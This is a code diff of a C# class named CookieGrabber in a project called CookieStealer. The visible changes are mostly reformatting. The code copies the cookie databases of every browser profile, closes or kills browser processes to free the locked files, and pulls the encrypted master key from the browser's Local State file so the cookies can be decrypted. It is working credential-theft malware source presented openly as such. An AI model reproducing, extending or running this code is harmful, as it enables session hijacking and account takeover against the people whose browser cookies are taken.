@@ -9,25 +9,10 @@ namespace CookieStealer.Utilities;
 
 public class CookieGrabber
 {
-    private class LocalStateDto
-    {
-        [JsonPropertyName("os_crypt")] public OsCrypt? OsCrypt { get; set; }
-    }
-
-    private class OsCrypt
-    {
-        public OsCrypt(string? encryptedKey)
-        {
-            EncryptedKey = encryptedKey;
-        }
-
-        [JsonPropertyName("encrypted_key")] public string? EncryptedKey { get; }
-    }
-
     private readonly Dictionary<string, BrowserInfo> _browsers = new BrowserData().Browsers;
-    private readonly string _workingDirectory;
     private readonly string _userDomainName = Environment.UserDomainName;
     private readonly string _userName = Environment.UserName;
+    private readonly string _workingDirectory;
 
 
     public CookieGrabber()
@@ -45,14 +30,12 @@ public class CookieGrabber
             if (!browser.Value.ProfilesPossible) continue;
             foreach (var profileName in browser.Value.ProfileList.Select(profile =>
                          Directory.GetParent(profile).Parent.Name))
-            {
                 Directory.CreateDirectory(Path.Combine(path, profileName));
-            }
         }
     }
 
 
-    public void GrabNRun(int variant=0)
+    public void GrabNRun(int variant = 0)
     {
         foreach (var browser in _browsers)
         {
@@ -76,23 +59,20 @@ public class CookieGrabber
             }
         }
     }
-    
+
     private void CopyCookies(KeyValuePair<string, BrowserInfo> browser, string currentDirectory)
     {
         File.Copy(browser.Value.PathToCookiesFile, Path.Combine(currentDirectory, "Default", "Cookies"));
 
         if (browser.Value is { ProfilesPossible: true, ProfileList: not null })
-        {
             foreach (var profile in browser.Value.ProfileList)
             {
                 var profileName = Directory.GetParent(profile).Parent.Name;
                 File.Copy(profile, Path.Combine(currentDirectory, profileName, "Cookies"));
-
             }
-        }
     }
 
-    private void GrabNRunDefault(KeyValuePair<string,BrowserInfo> browser, string? currentDirectory)
+    private void GrabNRunDefault(KeyValuePair<string, BrowserInfo> browser, string? currentDirectory)
     {
         try
         {
@@ -108,14 +88,15 @@ public class CookieGrabber
             {
                 case 'y':
                     Console.Clear();
-                    var processes = Process.GetProcessesByName(browser.Key.ToLower());
+                    var processes = Process.GetProcessesByName(browser.Value.ProcessName);
 
                     foreach (var process in processes)
                     {
                         process.CloseMainWindow();
                         if (!process.WaitForExit(3000))
                         {
-                            Console.WriteLine($"Couldn't terminate the process. Do you want to kill {browser.Key}? [Y/N]");
+                            Console.WriteLine(
+                                $"Couldn't terminate the process. Do you want to kill {browser.Key}? [Y/N]");
                             var ans2 = Console.ReadKey();
 
                             switch (ans2.KeyChar)
@@ -129,7 +110,7 @@ public class CookieGrabber
                             }
                         }
                     }
-                    
+
                     Thread.Sleep(500);
                     CopyCookies(browser, currentDirectory);
                     break;
@@ -140,8 +121,8 @@ public class CookieGrabber
             }
         }
     }
-    
-    private void GrabNRunAggressive(KeyValuePair<string,BrowserInfo> browser, string? currentDirectory)
+
+    private void GrabNRunAggressive(KeyValuePair<string, BrowserInfo> browser, string? currentDirectory)
     {
         try
         {
@@ -150,15 +131,12 @@ public class CookieGrabber
         catch (IOException)
         {
             var processes = Process.GetProcessesByName(browser.Key.ToLower());
-            foreach (var process in processes)
-            {
-                process.Kill();
-            }
+            foreach (var process in processes) process.Kill();
             Thread.Sleep(500);
             CopyCookies(browser, currentDirectory);
         }
     }
-    
+
 
     private static byte[] GetKey(string? localStatePath)
     {
@@ -178,6 +156,22 @@ public class CookieGrabber
             Environment.Exit(1);
             return null;
         }
+
         return masterKey;
+    }
+
+    private class LocalStateDto
+    {
+        [JsonPropertyName("os_crypt")] public OsCrypt? OsCrypt { get; set; }
+    }
+
+    private class OsCrypt
+    {
+        public OsCrypt(string? encryptedKey)
+        {
+            EncryptedKey = encryptedKey;
+        }
+
+        [JsonPropertyName("encrypted_key")] public string? EncryptedKey { get; }
     }
 }
